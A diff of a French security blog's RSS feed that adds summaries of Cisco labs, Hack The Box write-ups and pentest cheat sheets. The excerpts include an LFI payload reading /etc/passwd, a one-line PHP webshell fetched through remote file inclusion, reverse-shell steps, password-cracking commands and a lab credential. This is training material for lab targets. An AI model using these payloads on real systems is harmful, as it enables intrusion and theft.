@@ -5,18 +5,76 @@
     <link>http://lololekik.com/</link>
     <description>Recent content on LOLOLEKIK</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>fr</language>
-    
-	<atom:link href="http://lololekik.com/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>fr</language><atom:link href="http://lololekik.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Box pwn</title>
-      <link>http://lololekik.com/hackthebox/</link>
+      <title>[Cisco] ACL standard &amp; étendue</title>
+      <link>http://lololekik.com/network/cisco_acl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>http://lololekik.com/hackthebox/</guid>
-      <description>HELLO HELLO</description>
+      <guid>http://lololekik.com/network/cisco_acl/</guid>
+      <description>** Mise en place des ACL pour sécuriser les accès réseaux**
+Introduction Les Access Control List (ACL) sont des règles qui permettent d&amp;rsquo;autoriser ou refuser certains traffique. Les ACL peuvent s&amp;rsquo;appuyer sur de nombreux paramètres pour filtrer les accès comme l&amp;rsquo;adresse IP source ou encore le port à joindre. Au sein des systèmes Cisco, on identifie deux types d&amp;rsquo;ACL distinct. Les ACL standard et les ACL étendue.
+ACL Standard Les ACL standard, sont les acl qui proposent le moins de paramètres à surveiller.</description>
+    </item>
+    
+    <item>
+      <title>[Cisco] Routage dynamique - OSPF</title>
+      <link>http://lololekik.com/network/cisco_ospf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/network/cisco_ospf/</guid>
+      <description>** Configuration du routage dynamique avec OSPF**
+Introduction Open Shortest Path First (OSPF) est un protocole de routage à état de liens. Il permet de trouver les chemins les plus &amp;ldquo;courts&amp;rdquo; en vérifiant plusiseurs paramètres, comme la bande passante, afin de trouver un réseau. Pour la réalisation de ce TP, j&amp;rsquo;utiliserai Cisco Packet Tracer Student. Pour les switchs nous utiliserons les switchs Cisco 2960 et pour les routeurs nous utiliserons les routeurs Cisco 2911.</description>
+    </item>
+    
+    <item>
+      <title>[Cisco] Vlan &amp; Routage inter vlan</title>
+      <link>http://lololekik.com/network/cisco_vlan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/network/cisco_vlan/</guid>
+      <description>Mise en place de Vlan et du routage inter-vlan sur un routeur Cisco
+Introduction Les Virtual Local Area Network (VLAN), sont des réseaux informatiques séparés logiquement entre eux. Cela permet d&amp;rsquo;isoler logiquement les flux entre les équipements d&amp;rsquo;interconnexion. Pour la réalisation de ce TP, j&amp;rsquo;utiliserai Cisco Packet Tracer Student. Pour les switchs nous utiliserons les switchs Cisco 2960 et pour les routeurs nous utiliserons les routeurs Cisco 2911. On va isoler un trois réseaux pour trois services différents.</description>
+    </item>
+    
+    <item>
+      <title>Active directory </title>
+      <link>http://lololekik.com/cuisine/ad/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/ad/</guid>
+      <description>Introduction Active directory est le service d&amp;rsquo;annuaire LDAP de microsoft. Il écoute sur le port 389 (Local domain controller) et 3268 (forêt entière)
+Bloodhound Bloodhound est un outil permettant d&amp;rsquo;avoir un visuel l&amp;rsquo;architecture de l&amp;rsquo;active directory. Il permet de rapidement visualiser les droits, utilisateurs, objets..
+Récupération des informations pour construire la BDD
+──(lololekik㉿Ashitaka)-[~/tools/bloodhound/sauna] └─$ bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All INFO: Found AD domain: egotistical-bank.local INFO: Connecting to LDAP server: SAUNA.</description>
+    </item>
+    
+    <item>
+      <title>DNS - Transfert de Zone </title>
+      <link>http://lololekik.com/cuisine/zonetransfert/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/zonetransfert/</guid>
+      <description>Introduction Un transfert de zone DNS permet d&amp;rsquo;obtenir une liste de machine inscrite dans le DNS interrogé.
+Host host -l &amp;lt;nom de domaine&amp;gt; &amp;lt;adresse du serveur DNS&amp;gt; DNSRecon dnsrecon -d &amp;lt;nom de domaine&amp;gt; -t axfr DNSenum dnsenum &amp;lt;nom de domaine&amp;gt; NMAP nmap --script=dns-zone-transfer -p 53 &amp;lt;adresse du serveur DNS&amp;gt; </description>
+    </item>
+    
+    <item>
+      <title>Fcrackzip - Zip BruteForce </title>
+      <link>http://lololekik.com/cuisine/fcrackzip/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/fcrackzip/</guid>
+      <description>Utilisation fcrackzip
+Téléchargement Pour le télécharger :
+sudo apt-get update sudo apt-get install fcrackzip  Utilisation Pour obtenir l&amp;rsquo;aide fcrakzip :
+fcrackzip --help
+Pour l&amp;rsquo;utiliser :
+Pour les options :
+-v = verbos
+-u = Utilise unzip pour tester la décompression
+-D = utilisation du mode dictionnaire
+-p = indication des mots de passes à tester</description>
     </item>
     
     <item>
@@ -26,9 +84,239 @@
       
       <guid>http://lololekik.com/writeups/fcsc-anssi/</guid>
       <description>CTF organisé par l&amp;rsquo;ANSSI pour effectuer les préselections de l&amp;rsquo;ECSC
-Introduction Cette année j&amp;rsquo;ai eu le plaisir de participer au CTF de l&amp;rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&#39;était un expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
+Introduction Cette année j&amp;rsquo;ai eu le plaisir de participer au CTF de l&amp;rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&amp;rsquo;était une expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
 Ah oui et voici mon classement :
 Ce qui correspondait à 75 sur 633 dans la catégorie Sénior.</description>
+    </item>
+    
+    <item>
+      <title>Lame - Easy</title>
+      <link>http://lololekik.com/hack-the-box/lame/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/lame/</guid>
+      <description>Résolution de la box Lame
+Introduction La box Lame de Hack The Box est une box Linux de difficulté &amp;ldquo;Easy&amp;rdquo;. Cette box fait aussi parti du parcours &amp;ldquo;Beginner Track&amp;rdquo; du mode &amp;ldquo;Tracks&amp;rdquo;.
+Enumeration Pour commencer on énumère les ports ouverts pour trouver les services distants.
+FTP Anonyme On voit que le service FTP est accessible en anonyme. On tente une connexion pour vérifier s&amp;rsquo;il y a des fichiers qui pourraient nous intéresser.</description>
+    </item>
+    
+    <item>
+      <title>Mango - Medium</title>
+      <link>http://lololekik.com/hack-the-box/mango/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/mango/</guid>
+      <description>Résolution de la box Mango
+Introduction La box Mango de Hack The Box est une box Linux de difficulté &amp;ldquo;Medium&amp;rdquo;.
+Foothold &amp;amp; User Enumération On débute la box, comme d&amp;rsquo;habitude, avec un nmap.
+On voit ici que deux ports web sont ouverts. En se rendant sur le site web en https on inspecte le certificat. On voit rapidement une entrée qui nous intéresse.
+On essaie de voir si en renseignant le nom dans notre fichier host nous n&amp;rsquo;allons pas être redirigé sur un autre site.</description>
+    </item>
+    
+    <item>
+      <title>MSRPC </title>
+      <link>http://lololekik.com/cuisine/msrpcenum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/msrpcenum/</guid>
+      <description>Introduction msrpc est un protocole client/serveur developpé pour executé des tâches sur un serveur distant. Il écoute sur le port 139.
+NMAP - Script Service accessible dans l&amp;rsquo;annuaire (portmapper)
+┌──(lololekik㉿Ashitaka)-[~] └─$ sudo nmap &amp;lt;ip&amp;gt; --script=msrpc-enum </description>
+    </item>
+    
+    <item>
+      <title>NFS </title>
+      <link>http://lololekik.com/cuisine/nfsenum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/nfsenum/</guid>
+      <description>Introduction NFS est un protocole qui permet à un client d&amp;rsquo;accèder à des fichiers à travers le réseau. Un client désireux d&amp;rsquo;effectuer une requête NFS s&amp;rsquo;adresse au portmapper (port 111 en TCP ou UDP) et lui demande où se trouve le serveur NFS. On lui répond généralement en indiquant le port 2049 (port par défaut pour NFS).
+NMAP - RPCINFO Service accessible dans l&amp;rsquo;annuaire (portmapper)
+┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Cuisine] └─$ nmap -p 111 --script=rpcinfo metasploitable.</description>
+    </item>
+    
+    <item>
+      <title>NoSQL Injection Blind</title>
+      <link>http://lololekik.com/exploit/nosqlinjection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/exploit/nosqlinjection/</guid>
+      <description>Introduction Pour les injections NoSQL comme mongoDB, j&amp;rsquo;ai developpé un petit script qui permet de trouver des informations à l&amp;rsquo;aveugle. Il suffit de rentrer l&amp;rsquo;url en indiquant l&amp;rsquo;endroit d&amp;rsquo;injection. Il faut ensuite préciser au script comment il peut reconnaitre une page d&amp;rsquo;erreur et une page valide. Puis le tour est joué !
+Avant de faire tourner le script il faut connaitre la page qui nous donne une erreur et la page qui nous indique que le payload a fonctionné.</description>
+    </item>
+    
+    <item>
+      <title>OpenAdmin - Easy</title>
+      <link>http://lololekik.com/hack-the-box/openadmin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/openadmin/</guid>
+      <description>Résolution de la box OpenAdmin
+Introduction La box OpenAdmin de Hack The Box est une box Linux de difficulté &amp;ldquo;Easy&amp;rdquo;.
+Foothold Enumération On commence par un nmap avec l&amp;rsquo;option -A car c&amp;rsquo;est une machine HTB et on ne risque pas de la faire tomber.
+On peut constater qu&amp;rsquo;il y a un service web et un service ssh. On regade sur le service web est vulnérable avec searchsploit.
+Il n&amp;rsquo;y a pas d&amp;rsquo;exploit qui nous permettrait de prendre la main sur la machine.</description>
+    </item>
+    
+    <item>
+      <title>Remote - Easy</title>
+      <link>http://lololekik.com/hack-the-box/remote/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/remote/</guid>
+      <description>Résolution de la box Sauna
+Introduction La box Remote de Hack The Box est une box Windows de difficulté &amp;ldquo;Easy&amp;rdquo;.
+User Enumération On commence par faire un nmap sur tous les ports.
+┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Hack The Box] └─$ sudo nmap -A remote.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 11:45 CET Nmap scan report for remote.htb (10.10.10.180) Host is up (0.032s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.</description>
+    </item>
+    
+    <item>
+      <title>Sauna - Easy</title>
+      <link>http://lololekik.com/hack-the-box/sauna/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/sauna/</guid>
+      <description>Résolution de la box Sauna
+Introduction La box Sauna de Hack The Box est une box Windows de difficulté &amp;ldquo;Easy&amp;rdquo;.
+User 1 Enumération On commence par faire un nmap sur tous les ports.
+┌──(lololekik㉿Ashitaka)-[~] └─$ sudo nmap -A sauna.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 09:13 CET Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.043s latency). Not shown: 988 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.</description>
+    </item>
+    
+    <item>
+      <title>SMB &amp; NetBIOS </title>
+      <link>http://lololekik.com/cuisine/smbenum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/smbenum/</guid>
+      <description>Introduction On peut retrouver deux services important ici. NetBIOS UDP (138) TCP (139) et SMB TCP 445
+NBTscan Il est possible d&amp;rsquo;utiliser nbtscan sur une adresse réseau avec son CIDR.
+┌──(lololekik㉿Ashitaka)-[~] └─$ sudo nbtscan -r 192.168.1.91 Doing NBT name scan for addresses from 192.168.1.91 IP address NetBIOS Name Server User MAC address ------------------------------------------------------------------------------ 192.168.1.91 METASPLOITABLE &amp;lt;server&amp;gt; METASPLOITABLE 00:00:00:00:00:00 NMAP On peut retrouver beaucoup de scripts ici
+┌──(lololekik㉿Ashitaka)-[~] └─$ ll /usr/share/nmap/scripts/smb* -rw-r--r-- 1 root root 3355 12 oct.</description>
+    </item>
+    
+    <item>
+      <title>SMTP - Enumeration </title>
+      <link>http://lololekik.com/cuisine/smtpenum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/smtpenum/</guid>
+      <description>Introduction SMTP est un protocole sur le port 25 utilisé pour envoyer des mails
+Netcat Enumération d&amp;rsquo;utilisateur
+┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Cuisine] └─$ nc -n 192.168.1.91 25 1 ⨯ 220 metasploitable.localdomain ESMTP Postfix (Ubuntu) VRFY ROOT 252 2.0.0 ROOT VRFY msfadmin 252 2.0.0 msfadmin VRFY LOLOLEKIK 550 5.1.1 &amp;lt;LOLOLEKIK&amp;gt;: Recipient address rejected: User unknown in local recipient table </description>
+    </item>
+    
+    <item>
+      <title>SNMP - Enumeration </title>
+      <link>http://lololekik.com/cuisine/snmpenum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/snmpenum/</guid>
+      <description>Introduction SNMP est un protocole permettant de superviser un réseau via les ports 161 et 162 (pour les traps).
+Onesixtyone Enumération d&amp;rsquo;utilisateur
+onesixtyone -c &amp;lt;fichier avec les communautés à tester&amp;gt; -i &amp;lt;fichier avec les ips&amp;gt; onesixtyone &amp;lt;ip&amp;gt; &amp;lt;communauté&amp;gt; SNMwalk Enumération de l&amp;rsquo;arbre MIB entièrement snmpwalk -c &amp;lt;communauté&amp;gt; -v &amp;lt;version&amp;gt; &amp;lt;ip&amp;gt; Enumération des utilisateurs windows Il existe plein de branches à l&amp;rsquo;arbre MIB à interroger. On peut demander les ports ouverts, les services présents, les utilisateurs etc&amp;hellip;</description>
+    </item>
+    
+    <item>
+      <title>ssh2john - RSA Private Key BruteForce </title>
+      <link>http://lololekik.com/cuisine/ssh2john/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/ssh2john/</guid>
+      <description>Introduction ssh2john est un outil permettant de transformer une clé RSA dans un format utilisable par John The Ripper. On peut retrouver l&amp;rsquo;outil ici : https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
+Utilisation Pour l&amp;rsquo;utiliser il faut d&amp;rsquo;abord un fichier avec un certificat dedans.
+Ensuite utilisation de ssh2john
+./ssh2john.py joanna.pub &amp;gt; 4john  Ensuite il ne manque plus qu&amp;rsquo;a déchifrer avec John The Ripper
+Utilisation concrète dans la box Openadmin https://lololekik.com/hack-the-box/openadmin/</description>
+    </item>
+    
+    <item>
+      <title>Traceback - Easy</title>
+      <link>http://lololekik.com/hack-the-box/traceback/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/traceback/</guid>
+      <description>Résolution de la box Mango
+Introduction La box Traceback de Hack The Box est une box Linux de difficulté &amp;ldquo;Easy&amp;rdquo;.
+Foothold Enumération On commence par faire un nmap sur tous les ports.
+On voit qu&amp;rsquo;il y a un serveur web. En se rendant dessus on trouve ceci.
+On va donc se créer une wordlist avec plein de webshell populaire pour voir si on peut en retrouver un. La liste a été prise ici : https://github.</description>
+    </item>
+    
+    <item>
+      <title>Traverexec - Easy</title>
+      <link>http://lololekik.com/hack-the-box/traverxec/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/hack-the-box/traverxec/</guid>
+      <description>Résolution de la box Traverexec
+Introduction La box OpenAdmin de Hack The Box est une box Linux de difficulté &amp;ldquo;Easy&amp;rdquo;.
+Foothold Enumération Comme d&amp;rsquo;habitude on commence avec un nmap.
+On voit via searchsploit que la version de nostromo est vulnérable à une RCE
+Exploit On récupère le script présent sur exploitdb https://www.exploit-db.com/exploits/47837 puis on l&amp;rsquo;execute pour vérifier la vulnérabilité.
+Maintenant on va s&amp;rsquo;envoyer un shell via netcat.
+Et on vérifie sur notre port en écoute si on l&amp;rsquo;a bien reçu.</description>
+    </item>
+    
+    <item>
+      <title>Upgrade Reverse Shell</title>
+      <link>http://lololekik.com/cuisine/upgradere/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/upgradere/</guid>
+      <description>Upgrade Reverse Shell avec ZSH On utilise python
+python3 -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;);&#39; D&amp;rsquo;abord on met notre shell en arrière-plan
+CTRL + Z on note le nombre de ligne et colonne
+stty -a Dans le shell de notre machine on écrit
+stty raw -echo; fg Et on appuie deux fois sur entrée. Ensuite on met notre shell à la bonne taille
+stty rows ROW columns COL Puis on fait afficher les couleurs</description>
+    </item>
+    
+    <item>
+      <title>Web - File Inclusion</title>
+      <link>http://lololekik.com/cuisine/lfi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/lfi/</guid>
+      <description>Introduction Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.
+LFI payload
+http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd  RFI &amp;amp; Simple WEBSHELL Sur notre machine on créé un fichier lololekik.php
+&amp;lt;?php shell_exec($_GET[&amp;#39;lolo&amp;#39;]) ?&amp;gt;Démarrage du serveur web
+┌──(lololekik㉿Ashitaka)-[~/metasploitable] └─$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Puis utiliser la commande suivante pour utiliser le webshell
+http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;amp;lolo=ifconfig LFI &amp;amp; Log poisonning Il est possible de contaminer plusieurs fichiers de log voici l&amp;rsquo;exemple avec /var/log/apache2/access.</description>
+    </item>
+    
+    <item>
+      <title>Web - SQLi </title>
+      <link>http://lololekik.com/cuisine/sqli/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/sqli/</guid>
+      <description>Introduction Les injections SQL permettent via une entrée utilisateur de modifier la requête envoyé à la BDD.
+Manuel Lorsqu&amp;rsquo;on trouve une SQLI et que l&amp;rsquo;on veut énumerer les tables il faut d&amp;rsquo;abord savoir quels sont les colonnes afficher dans la table. Pour cela on commence par trouver le nombre de colonne de la table que l&amp;rsquo;on requête. Pour cela on utilise l&amp;rsquo;instruction order by pour faire un tri sur les colonnes.</description>
+    </item>
+    
+    <item>
+      <title>wfuzz - Fuzzing Web </title>
+      <link>http://lololekik.com/cuisine/wfuzz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/wfuzz/</guid>
+      <description>Introduction wfuzz est un outil permettant de faire du bruteforfce sur les répertoires web afin de trouver des pages intéressantes.
+Voici le git de wfuzz : https://github.com/xmendez/wfuzz
+Aide -h # help --help # aide avancée -w # wordlist --hc	# pour cacher les pages avec un code spécifique --hl	# pour cacher les pages avec un nombre de ligne spécifique --hw	# pour cacher les pages avec un nombre de mot spécifique --hh	# pour cacher les pages avec un nombre de charactère spécifique -b # ajouter des cookies -d # Requête post -u # url --ip	# utilise l&#39;ip sous le format &#39;ip:port&#39; -f # fichier de sortie -L/--follow # suivre les redirections -X # methode -R # Recusrif Recherche de répertoire avec dictionnaire Ici on cache toute les requêtes avec un code 404.</description>
+    </item>
+    
+    <item>
+      <title>WinRM </title>
+      <link>http://lololekik.com/cuisine/winrm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/winrm/</guid>
+      <description>Introduction Winrm est un protocole permettant de faire de la gestion à distance. Il repose sur le port 5985 en HTTP et 5986 en HTTPS.
+Crackmapexec Via le module Winrm de crackmapexec on peut vérifier des couples user/password et faire une RCE.
+sudo crackmapexec winrm -u &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; -d &amp;lt;domain&amp;gt; &amp;lt;host/Ip&amp;gt; -x command Il est aussi possible d&amp;rsquo;invoquer des shells via des modules.
+Evil-winrm Evil Winrm permet d&amp;rsquo;obtenir un shell</description>
     </item>
     
   </channel>
